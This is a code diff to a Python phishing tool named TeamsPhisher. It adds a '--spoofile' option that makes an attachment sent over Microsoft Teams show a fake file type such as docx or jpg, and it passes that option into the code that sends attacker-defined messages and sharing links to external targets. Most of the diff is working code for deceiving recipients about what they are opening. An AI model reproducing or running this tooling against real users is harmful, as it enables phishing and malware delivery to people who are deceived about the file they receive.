@@ -414,7 +414,7 @@ def removeExternalUser(skypeToken, senderInfo, threadID, targetInfo):
         return None
 
 
-def sendFile(skypeToken, threadID, senderInfo, targetInfo, inviteInfo, senderSharepointURL, senderDrive, attachment, message, personalize, nogreeting):
+def sendFile(skypeToken, threadID, senderInfo, targetInfo, inviteInfo, senderSharepointURL, senderDrive, attachment, message, personalize, nogreeting, spoofile):
 
     # Sending a real message to a target
     if threadID:
@@ -452,6 +452,15 @@ def sendFile(skypeToken, threadID, senderInfo, targetInfo, inviteInfo, senderSha
     # Assemble final message
     assembledMessage = introduction + jsonMsg
 
+    # Functionality to spoof the attachment
+    filetype = attachment.split(".")[-1]
+    filename = os.path.basename(attachment)
+    if spoofile:
+        filetype = spoofile
+        lastdotindex = filename.rfind(".")
+        filename = os.path.basename(attachment)[:lastdotindex + 1] + filetype
+
+
     body = """{
         "content": "%s",
         "messagetype": "RichText/Html",
@@ -464,7 +473,7 @@ def sendFile(skypeToken, threadID, senderInfo, targetInfo, inviteInfo, senderSha
             "importance": "",
             "subject": ""
         }
-    }""" % (assembledMessage, uploadInfo.get('sharepointIds').get('listItemUniqueId'), senderSharepointURL, senderDrive, attachment.split(".")[-1], os.path.basename(attachment), senderSharepointURL, senderDrive, os.path.basename(attachment), uploadInfo.get('sharepointIds').get('listItemUniqueId'), os.path.basename(attachment), attachment.split(".")[-1], senderSharepointURL, senderDrive, os.path.basename(attachment), senderSharepointURL, senderDrive, inviteInfo.get('d').get('ShareLink').get('sharingLinkInfo').get('Url'), inviteInfo.get('d').get('ShareLink').get('sharingLinkInfo').get('ShareId'))
+    }""" % (assembledMessage, uploadInfo.get('sharepointIds').get('listItemUniqueId'), senderSharepointURL, senderDrive, filetype, filename, senderSharepointURL, senderDrive, os.path.basename(attachment), uploadInfo.get('sharepointIds').get('listItemUniqueId'), os.path.basename(attachment), attachment.split(".")[-1], senderSharepointURL, senderDrive, os.path.basename(attachment), senderSharepointURL, senderDrive, inviteInfo.get('d').get('ShareLink').get('sharingLinkInfo').get('Url'), inviteInfo.get('d').get('ShareLink').get('sharingLinkInfo').get('ShareId'))
     
     # Send Message
     content = requests.post(url, headers=headers, data=body.encode(encoding='utf-8'))
@@ -622,6 +631,7 @@ if __name__ == "__main__":
     parser.add_argument('--preview', dest='preview', action='store_true', required=False, help='Run in preview mode. See personalized names for targets and send test message to sender\'s Teams.')         
     parser.add_argument('--delay', dest='delay', type=int, required=False, default=0, help='Delay in [s] between each attempt. Default: 0')
     parser.add_argument('--nogreeting', dest='nogreeting', action='store_true', required=False, help='Do not use built in greeting or personalized names, only send message specified with --message')
+    parser.add_argument('--spoofile', dest='spoofile', type=str, required=False, help='Spoof the type of file shown in Teams client. Any extension is allowed, but recommended options are: docx, xlsx, pptx and jpg.')
     parser.add_argument('--log', dest='log', action='store_true', required=False, help='Write TeamsPhisher output to logfile')
 
     args = parser.parse_args()
@@ -666,6 +676,9 @@ if __name__ == "__main__":
     
     if args.sharepoint:
         p_success("Using manually specified sharepoint name: %s" % (args.sharepoint))
+    
+    if args.spoofile:
+        p_success("Using file spoofing technique, impersonating: %s" % (args.spoofile))
     else:
         p_warn("Resolving sharepoint name automatically- if your tenant uses a custom domain you might have issues!")
 
@@ -755,7 +768,7 @@ if __name__ == "__main__":
             threadID = None
 
             # Send attacker-defined message to ourselves for review
-            success = sendFile(skypeToken, threadID, senderInfo, senderInfo, inviteInfo, senderSharepointURL, senderDrive, args.attachment, args.message, args.personalize, args.nogreeting)
+            success = sendFile(skypeToken, threadID, senderInfo, senderInfo, inviteInfo, senderSharepointURL, senderDrive, args.attachment, args.message, args.personalize, args.nogreeting, args.spoofile)
 
         p_info("\nPreviewing customized names identified by TeamsPhisher\n")
     else:
@@ -799,7 +812,7 @@ if __name__ == "__main__":
                     inviteInfo = getInviteLink(sharepointToken, senderSharepointURL, senderDrive, senderInfo, targetInfo, uploadInfo.get('sharepointIds').get('listItemUniqueId'), args.securelink)
                     if inviteInfo:
                         # Send attacker-defined message to target with file sharing URL    
-                        success = sendFile(skypeToken, threadID, senderInfo, targetInfo, inviteInfo, senderSharepointURL, senderDrive, args.attachment, args.message, args.personalize, args.nogreeting)
+                        success = sendFile(skypeToken, threadID, senderInfo, targetInfo, inviteInfo, senderSharepointURL, senderDrive, args.attachment, args.message, args.personalize, args.nogreeting, args.spoofile)
                         removeExternalUser(skypeToken, senderInfo, threadID, targetInfo)
                     else:
                         numFailed += 1
